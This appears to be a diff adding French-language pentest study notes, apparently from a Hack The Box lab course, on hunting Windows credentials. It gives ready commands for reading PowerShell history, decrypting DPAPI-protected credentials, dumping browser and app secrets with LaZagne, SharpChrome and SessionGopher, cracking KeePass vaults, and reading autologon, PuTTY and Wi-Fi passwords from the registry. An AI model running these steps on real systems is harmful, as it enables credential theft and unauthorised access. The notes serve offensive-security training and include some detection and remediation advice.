@@ -1688,6 +1688,356 @@ Si tout se passe bien, un shell SYSTEM se connectera à l’attaquant.
 
 ---
 
+# Credential Hunting
+
+**But :** trouver des identifiants présents sur une machine pour escalade locale, pivot ou récupération de comptes de domaine.  
+(Conserve titres et commandes en English, le reste en français.)
+
+## Application Configuration Files
+**Description courte :** les applications peuvent stocker des mots de passe en clair dans des fichiers de config (`.config`, `.xml`, `.ini`, etc.). Chercher rapidement via `findstr`.
+
+**Commandes / Process :**
+- Rechercher de manière récursive des occurrences de `password` :  
+  `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml`
+- Vérifier `web.config` par défaut (IIS) : chercher dans `C:\inetpub\wwwroot\` ou rechercher récursivement.
+
+**Remarque :** note les chemins et fichiers contenant des credentials en clair (username/password, connectionStrings, etc.).
+
+## Dictionary & Browser Files
+**Description courte :** des mots sensibles peuvent être présents dans des fichiers dictionnaires ou profils d’applications (ex. Chrome custom dictionary).
+
+**Commandes / Process :**
+- Lire le fichier dictionnaire Chrome (exemple) :  
+  `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password`
+
+**Remarque :** fouiller `AppData\Local` / `AppData\Roaming` pour d’autres fichiers texte ou caches.
+
+## Unattended / Answer Files
+**Description courte :** fichiers d’installation non supervisée (`unattend.xml`) contiennent souvent `AutoLogon` en clair ou base64.
+
+**Exemple (ce qu’il contient) :** valeur `AutoLogon` → `<Value>local_4dmin_p@ss</Value>` et `<PlainText>true</PlainText>`
+
+**Process :**
+- Rechercher `unattend.xml` ou récursive : `findstr /SIM /C:"AutoLogon" *.xml *.unattend`
+- Vérifier copies dans images ou dossiers de build.
+
+## PowerShell History (PSReadLine)
+**Description courte :** depuis PS 5.0, l’historique des commandes est conservé et peut contenir des credentials passés en ligne de commande.
+
+**Chemin par défaut :** `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+**Commandes / Process :**
+- Obtenir le path en PowerShell :  
+  `(Get-PSReadLineOption).HistorySavePath`
+- Lire le fichier courant :  
+  `gc (Get-PSReadLineOption).HistorySavePath`
+- Lire l’historique pour tous les users accessibles :  
+  `foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`
+
+**Remarque :** chercher dans cet historique des `Set-ExecutionPolicy`, `wevtutil /u /p`, `net use`, `Invoke-WebRequest` contenant des credentials.
+
+## Credentials in Command Lines & Scripts
+**Description courte :** beaucoup d’outils acceptent `-u`/`-p` ou `-Password` — ces valeurs peuvent rester en clair dans scripts ou historiques.
+
+**Exemples à rechercher :**
+- `wevtutil qe ... /u:DOMAIN\user /p:password`
+- `Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password <pwd>`
+- `msiexec /qn /L*V ... PASSWORD=...`
+
+**Process :**
+- `findstr /SIM /C:"/u:" /C:"/p:" /C:"-Password" *.*`.
+
+## PowerShell Credentials (Export-Clixml / DPAPI)
+**Description courte :** `Get-Credential | Export-Clixml` sauvegarde des credentials chiffrés via DPAPI — récupérables par le même utilisateur sur la même machine.
+
+**Pattern / Process :**
+- Localiser les fichiers `*.xml` contenant credentials (ex : `C:\scripts\pass.xml`).  
+- Lire et extraire :  
+  `Import-Clixml -Path 'C:\scripts\pass.xml'` → `$cred = Import-Clixml -Path 'C:\scripts\pass.xml'`  
+  `$cred.GetNetworkCredential().Username`  
+  `$cred.GetNetworkCredential().Password`
+
+**Remarque :** si tu as l’accès au compte qui a créé le fichier (ou la clé DPAPI), tu peux déchiffrer.
+
+## DPAPI & User-Specific Encryption
+**Description courte :** nombreux secrets (certificats, credentials) sont protégés par DPAPI — déchiffrables par le même user / machine ou via vol des clés DPAPI + master key.
+
+**Process utiles :**
+- Rechercher fichiers `*.blob`, `*.xml` dans `AppData\Roaming` ou `ProgramData` qui utilisent DPAPI.  
+- Si escalation local disponible, utiliser outils (ex : `mimikatz`, `dpapi` helpers) pour tenter la récupération.
+
+## Quick Generic Searches
+- Trouver fichiers texte avec mots-clés courants :  
+  `findstr /S /I /M /C:"password" *.*`  
+  `findstr /S /I /M /C:"username" *.*`
+- Chercher clés `AutoLogon` / `PlainText` dans XML :  
+  `findstr /S /I /C:"AutoLogon" *.xml`
+- Chercher fichiers `*.xml`, `*.config`, `*.ini` modifiés récemment : trier par date avec `dir /O:-D` ou PowerShell `Get-ChildItem -Recurse | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) }`
+
+---
+
+# Other Files
+
+**But :** repérer rapidement d’autres fichiers locaux ou sur partages réseau pouvant contenir des credentials ou infos sensibles (SSH keys, VHD/VMDK, OneNote, Excel, .kdbx, .ppk, etc.).  
+(Titres et commandes en anglais, explications en français.)
+
+## Quick crawl of shares
+- Utiliser **Snaffler** pour crawler les partages réseau et chercher extensions intéressantes : `.kdbx`, `.vmdk`, `.vhdx`, `.ppk`, `.rdp`, `.ps1`, `.xml`, `.config`, `.sqlite`, etc.
+- Commande example (local) : `snaffler -d \\FILESERVER\share -o results.json`  
+
+## Manual file-content searches
+
+- Chercher dans un dossier pour occurrences de `password` :  
+  `cd C:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`  
+- Chercher partout et afficher ligne + numéro :  
+  `findstr /spin "password" *.*`  
+- PowerShell : rechercher `password` dans tous les `.txt` d’un dossier :  
+  `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password`  
+- Recherche d’extensions par motif (cmd) :  
+  `dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *.vnc *.config`  
+- Recherche récursive d’un type (where) :  
+  `where /R C:\ *.config`  
+- PowerShell recherche d’extensions (rapide) :  
+  `Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore`
+  
+## Sticky Notes (Windows 10+)
+
+- Emplacement Sticky Notes DB :  
+  `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`  
+- Lister fichiers associés :  
+  `ls C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`  
+- Copier les 3 fichiers `plum.sqlite*` et ouvrir avec DB Browser for SQLite ou utiliser `strings` :  
+  `strings plum.sqlite-wal | grep -i vcenter`  
+- PowerShell (PSSQLite) pour lire la table Note :  
+  `Import-Module .\PSSQLite.psd1`  
+  `$db = 'C:\path\to\plum.sqlite'`  
+  `Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap`
+
+## Inspect DB and binary files fast
+
+- Utiliser `strings` sur gros fichiers (VHD, VMDK, sqlite, wal, etc.) :  
+  `strings file.vhd | grep -i password`  
+- Monter un VHD/VHDX localement si possible : `Mount-VHD -Path C:\path\to\disk.vhdx` (PowerShell)  
+- Examiner fichiers Office/OneNote for plain text or embedded credentials (export / unzip for .docx/.xlsx).
+
+## Common places & file types to check
+- User folders & shares: `C:\Users\<user>\Documents`, `\\FILE01\users\bjones`  
+- Browser profiles: `AppData\Local\Google\Chrome\User Data\Default` (custom dictionaries, cookies)  
+- VM images: `.vmdk`, `.vhdx`, `.vhd`  
+- Backup images and archives: `.zip`, `.7z`, `.tar` sur shares  
+- Password managers / databases: `.kdbx` (KeePass)  
+- SSH keys: `id_rsa`, `*.ppk`  
+- RDP files: `*.rdp` (contiennent parfois username)  
+- PowerShell scripts: `*.ps1` (rechercher `-Password`, `-Credential`)  
+- Unattend / answer files: `unattend.xml` (AutoLogon value)  
+- StickyNotes DB: `plum.sqlite*` (voir plus haut)  
+- Temp & browser cache: `%USERPROFILE%\Local Settings\Temp`, `Content.IE5`, `AppData\Local\Temp`  
+- System artifacts: `%SYSTEMDRIVE%\pagefile.sys`, `%WINDIR%\repair\*`, `%USERPROFILE%\ntuser.dat`
+
+## Searching shares at scale
+- Exporter liste fichiers puis greper localement (si accès SMB) :  
+  `robocopy \\FILE01\users C:\temp\listing /L /S` (simulate) puis greps.  
+- Copier uniquement extensions intéressantes pour analyse off-box : privilégier `rsync`/`robocopy` filtrés.
+
+## Examples: extract credential-like strings
+
+- findstr for common patterns:  
+  `findstr /spin /C:"password" /C:"pwd" /C:"passwd" *.*`  
+- Grep-like in PowerShell:  
+  `Get-ChildItem -Recurse -Include *.txt,*.config,*.xml | Select-String -Pattern "password|pwd|passwd" | ft Path,LineNumber,Line`
+
+## Post-discovery actions
+- Tester cred trouvés localement : `net user <user> <pass>` (vérifier) ou `runas /user:DOMAIN\user "cmd.exe"`  
+- Tester clés SSH/PPK : `ssh -i id_rsa user@host` ; convertir PPK → OpenSSH si besoin.  
+- Si image montée contient SAM/System, extraire hashs via `impacket-secretsdump` ou `samparse` (en labo uniquement).
+
+
+## Tool
+- [Snaffler — crawl shares for secrets](https://github.com/SnaffCon/Snaffler)  
+
+---
+
+# Further Credential Theft – Cheat Sheet
+
+**But :** récupérer des credentials déjà enregistrés ou cachés sur le système Windows (navigateurs, registres, Wi-Fi, outils RDP, password managers, etc.).
+
+---
+
+## Cmdkey Saved Credentials
+**Description courte :** les utilisateurs peuvent stocker des credentials pour RDP, SMB, ou autres connexions via `cmdkey`.
+
+**Lister les credentials sauvegardés :**
+`cmdkey /list`
+
+**Exemple de sortie :**
+Target: LegacyGeneric:target=TERMSRV/SQL01  
+User: inlanefreight\bob  
+
+**Réutiliser le credential :**
+`runas /savecred /user:inlanefreight\bob "COMMAND_HERE"`
+
+---
+
+## Browser Credentials
+**Description courte :** Chrome et autres navigateurs Chromium stockent les mots de passe dans `Login Data` (SQLite).  
+Utiliser **SharpChrome** pour les extraire et déchiffrer.
+
+**Commande :**
+`.\SharpChrome.exe logins /unprotect`
+
+**Sortie typique :**
+`username: bob@inlanefreight.local`  
+`password: Welcome1`
+
+**Note défensive :**
+Détection possible via événements 4688 (process creation), 16385 (DPAPI), 4662/4663 (file/object access).
+
+---
+
+## Password Managers
+**Description courte :** fichiers `.kdbx` (KeePass), `.opvault`, `.1pif`, ou vaults d’entreprise (Thycotic, CyberArk) peuvent contenir des credentials critiques.
+
+**Extraction de hash KeePass :**
+`python2.7 keepass2john.py vault.kdbx > keepass_hash.txt`
+
+**Cracking du hash :**
+`hashcat -m 13400 keepass_hash.txt rockyou.txt`
+
+**Si succès :** accès complet au vault → escalade majeure.
+
+---
+
+## Email Search (MailSniper)
+**Description courte :** chercher des credentials dans les boîtes Exchange locales avec **MailSniper**.
+
+**Exemple :**
+- Connecter via OWA ou EWS.
+- Rechercher : `"pass OR creds OR credentials"`
+
+---
+
+## LaZagne
+**Description courte :** outil multi-modules pour extraire les credentials en clair de nombreuses applis (navigateurs, mails, bases, Wi-Fi, DPAPI, Credman, etc.).
+
+**Lister les modules :**
+`.\lazagne.exe -h`
+
+**Exécution complète :**
+`.\lazagne.exe all`
+
+**Exemple de résultats :**
+- WinSCP → `root / Summer2020!`
+- Credman → `jordan_adm / !QAZzaq1`
+
+**Option utile :**
+`-v` pour plus de détails  
+`-oN creds.txt` pour sortie fichier
+
+---
+
+## SessionGopher
+**Description courte :** PowerShell script pour extraire credentials de PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP, RSA, etc.  
+Cherche et déchiffre infos stockées dans HKEY_USERS.
+
+**Exécution :**
+`Import-Module .\SessionGopher.ps1`  
+`Invoke-SessionGopher -Target localhost`
+
+**Résultats possibles :**
+- Hostnames, usernames, passwords, sessions RDP/SSH stockées.
+
+**Remarque :**
+Besoin de privilèges admin pour interroger toutes les hives utilisateurs.
+
+---
+
+## Registry Stored Credentials
+
+### Windows AutoLogon
+**Description courte :** stockage en clair du mot de passe utilisé pour auto-login Windows.
+
+**Chemin clé :**
+`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
+
+**Commande :**
+`reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
+
+**Champs intéressants :**
+- `AutoAdminLogon`
+- `DefaultUserName`
+- `DefaultPassword`
+
+**Exemple :**
+`DefaultPassword    REG_SZ    HTB_@cademy_stdnt!`
+
+---
+
+### PuTTY Proxy Credentials
+**Description courte :** les sessions PuTTY avec proxy stockent les credentials en clair dans le registre.
+
+**Chemin clé :**
+`HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION_NAME>`
+
+**Lister les sessions :**
+`reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions`
+
+**Examiner une session :**
+`reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh`
+
+**Exemple :**
+`ProxyUsername    REG_SZ    administrator`  
+`ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!`
+
+---
+
+## Wi-Fi Credentials
+**Description courte :** Windows sauvegarde les profils Wi-Fi et leurs clés.  
+Peut permettre un accès réseau supplémentaire.
+
+**Lister les réseaux connus :**
+`netsh wlan show profile`
+
+**Afficher un mot de passe Wi-Fi :**
+`netsh wlan show profile <SSID> key=clear`
+
+**Exemple de sortie :**
+`Key Content : ILFREIGHTWIFI-CORP123908!`
+
+---
+
+## Résumé – Offensive Steps
+1. `cmdkey /list` → reuse creds via `runas /savecred`  
+2. `SharpChrome` → extraire logins browser  
+3. `LaZagne all` → cred en clair multi-apps  
+4. `SessionGopher` → creds RDP/SSH/FileZilla  
+5. `keepass2john + hashcat` → crack vault KeePass  
+6. `reg query Winlogon` → Autologon password  
+7. `reg query PuTTY` → Proxy credentials  
+8. `netsh wlan show profile key=clear` → Wi-Fi key  
+
+---
+
+## Remédiations rapides
+- Désactiver `AutoAdminLogon`.  
+- Supprimer credentials `cmdkey` après usage : `cmdkey /delete:<target>`.  
+- Chiffrer ou restreindre accès au registre utilisateur.  
+- Utiliser gestionnaire de mots de passe avec chiffrement fort.  
+- Interdire stockage de passwords en clair dans scripts ou outils RDP.  
+- Surveiller exécutions de `lazagne`, `SharpChrome`, `hashcat`, `cmdkey`, `reg.exe` pour détection.
+
+---
+
+## Outils recommandés
+- [SharpChrome – dump Chrome creds](https://github.com/GhostPack/SharpDPAPI) 
+- [LaZagne – récupération multi-sources](https://github.com/AlessandroZ/LaZagne)  
+- [SessionGopher – RDP / SSH creds](https://github.com/Arvanaghi/SessionGopher) 
+- [MailSniper – recherche mails Exchange](https://github.com/dafthack/MailSniper)   
+
+
+
+
+
+
 
 
 
